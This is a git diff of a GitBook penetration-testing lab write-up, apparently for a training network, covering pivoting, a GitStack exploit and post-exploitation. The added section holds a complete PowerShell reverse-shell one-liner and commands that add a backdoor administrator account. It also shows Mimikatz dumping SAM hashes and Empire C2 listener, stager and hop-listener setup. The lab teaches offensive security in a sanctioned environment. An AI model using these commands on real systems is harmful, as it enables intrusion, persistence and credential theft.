@@ -152,7 +152,7 @@ for i in {21 80 111 135 139 445 443 8080 3389}; do (echo > /dev/tcp/10.200.87.20
 
 I used a static nmap binary file and scan the internal networks from the victim 10.200.87.200 and found 3 other hosts.
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>pivot enumeration.</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>pivot enumeration.</p></figcaption></figure>
 
 ### <mark style="color:red;">Proxychains & Foxyproxy</mark>
 
@@ -206,7 +206,7 @@ There are two ways to create a forward SSH tunnel using the SSH client --> **por
   `ssh -L 9051:10.200.87.150:80 root@10.200.87.200 -fN`\
   &#x20;The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Access webpage hosted on port 80 10.200.87.150, from our kali localhost:9051</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Access webpage hosted on port 80 10.200.87.150, from our kali localhost:9051</p></figcaption></figure>
 
 * **Proxies (forward proxy)** are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:\
   `ssh -D 1337 root@10.200.87.150 -fN`
@@ -412,9 +412,9 @@ Our server: `python3 -m http.server 80` .
 
 So it’s an error page. There are 3 endpoints `/registration/login` `/gitstack` and `/rest`
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>http://10.200.87.150/gitstack</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>http://10.200.87.150/gitstack</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>searching google for available exploit</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption><p>searching google for available exploit</p></figcaption></figure>
 
 We got one from exploit-db --> [https://www.exploit-db.com/exploits/43777](https://www.exploit-db.com/exploits/43777)
 
@@ -451,6 +451,195 @@ Ok, since we can ping 10.200.87.200, and we also have a stable shell on 10.200.8
 
 * we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/ncat) and just catch the shell here.
 * We could set up a relay on .200 to forward a shell back to a listener using "socat" or "ligolo-ng".
+
+{% hint style="warning" %}
+Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:
+
+`firewall-cmd --zone=public --add-port 20000/tcp`&#x20;
+{% endhint %}
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>added a firewall rule to allow imbound traffic from tcp port 20000</p></figcaption></figure>
+
+{% hint style="success" %}
+We used nishang powershell reverse shell oneliner below.
+
+
+
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.87.200',20000);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+{% endhint %}
+
+I used Ligolo-ng to get the reverse shell :)
+
+<figure><img src=".gitbook/assets/image (100).png" alt=""><figcaption><p>got reverse shell on number 3.</p></figcaption></figure>
+
+## Git Server Stabilisation & Post Exploitation
+
+Since ports "3389" and "5985" are open on 10.200.87.150 for the purpose of this lab we will be establishing persistence by creating a new user, adding the user to the RDP group. We could also authenticate with new user account via WinRM using Evil-WinRM but evil-winrm won't allow for execution of high privilege task even though the user is in the local administrator group, hence, we will use RDP session instead.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+net user dking Password123!
+net localgroup Administrators dking /add
+net localgroup "Remote Management Users" dking /add
+
+# accessing new account via Evil-WinRM
+evil-winrm -i 10.200.87.150 -u dking -p 'Password123!'
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (101).png" alt=""><figcaption><p>successfully added a new user, and can access via evil-winRM</p></figcaption></figure>
+
+#### Via RDP using \[xfreerdp] utility
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+xfreerdp /v:10.200.87.150 /u:dking /p:Password123! +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+
+# since i specified "/usr/share/windows-resources" as the location to create as a shared folder and used "share" as the shared folder name, we can access this share using:
+\\tsclient\share
+
+# with this share we can easily execute files from our kali, without transfering them to the victim for execution.
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (102).png" alt=""><figcaption><p>success</p></figcaption></figure>
+
+Its time to dump the Hashes using Mimikatz:
+
+Open a privileged cmd prompt session, then type: `\tsclient\share\mimikatz\x64\mimikatz.exe` -&#x20;
+
+We execute the following cmds in order:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+privilege::debug
+token::elevate
+lsadump::sam # dumps all hashes.
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (103).png" alt=""><figcaption><p>:)</p></figcaption></figure>
+
+Now we have the hashes we could either crack them or do a "pass-the-hash" attack.
+
+We are more interested in the administrator accound hash.
+
+## Powershell Empire (C2)
+
+The C2 Matrix --> [https://www.thec2matrix.com/](https://www.thec2matrix.com/)
+
+```bash
+sudo powershell-empire server # start the server.
+sudo powershell-empire client # start the client.
+
+# or use the GUI (Starkiller)
+# username -> empireadmin and password -> password123
+http://localhost:1337/index.html
+```
+
+{% hint style="warning" %}
+With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the `/usr/share/powershell-empire/empire/client/config.yaml` file, or connect manually from the Empire CLI Client using `connect HOSTNAME --username=USERNAME --password=PASSWORD`
+{% endhint %}
+
+* Listeners are fairly self-explanatory. They listen for a connection and facilitate further exploitation
+* Stagers are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
+* Agents are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
+* Modules are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server
+
+### Empire Listeners
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# listener setup
+uselistener http # use an http listener.
+set name clihttp
+set Host 10.50.88.51
+set Port 8000
+options # used to view updated configs.
+execute # start listener.
+back # go back, or main menu.
+kill <listener_name> # kill a listener.
+
+# the process on the GUI is also intuituive (click the create button in the Listeners session).
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (104).png" alt=""><figcaption><p>listeners</p></figcaption></figure>
+
+### Empire Stagers
+
+Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# from the main empire prompt:
+usestager # list stagers.
+usestager multi/bash # or multi/launcher when in doubt.
+set listener clihttp # we could set other options as required also.
+execute # creating the stager in our /tmp directory.
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (105).png" alt=""><figcaption><p>stager</p></figcaption></figure>
+
+### Empire Agents
+
+Now that we've started a listener and created a stager, it's time to put them together to get an agent!.
+
+<figure><img src=".gitbook/assets/image (106).png" alt=""><figcaption><p>we just copy and paste the red section into our Jump host ssh session.</p></figcaption></figure>
+
+We get a new Agent checked in.
+
+<figure><img src=".gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+interact <agent_name> # to interact with the agent.
+help # display the help menu.
+rename <agent_name> <new_name> # to rename the agent.
+shell whoami # run shell cmds.
+kill <agent_name> # to kil the agent.
+```
+{% endcode %}
+
+### Empire Hop Listeners
+
+As mentioned previously, Empire agents can't be proxied with a socat relay or any equivalent redirects; but there must be a way to get an agent back from a target with no outbound access, right? The answer is yes. We use something called a Hop Listener.
+
+Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+uselistener http_hop # select the hop listener.
+set RedirectListener clihttp
+set Host 10.200.87.200
+set Port 47000
+execute # to start the listener.
+```
+{% endcode %}
+
+Specifically we need:-
+
+* A RedirectListener -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!
+* A Host -- the IP of the compromised webserver (`.200`).
+* A Port -- this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!
+
+\[......To be continued......]
+
+
+
+## Personal PC Enumeration
+
+We first need to scope out the final target! We know from the briefing that this target is likely to be the other Windows machine on the network. By process of elimination we can tell that this is Thomas' PC which he told us has antivirus software installed. \
+Since we have access to powershell, we can use the "Invoke-Portscan.ps1" script.
+
+We use evil-winRM and the Adminstrator hash we already have, upload the file to the .150 machine.
+
+`Invoke-Portscan -Hosts 10.200.87.100 -TopPorts 50` - we can also use the `Get-Help Invoke-Portscan` - to view the help menu.
+
+<figure><img src=".gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
+
+## Personal PC Pivoting
 
 
 
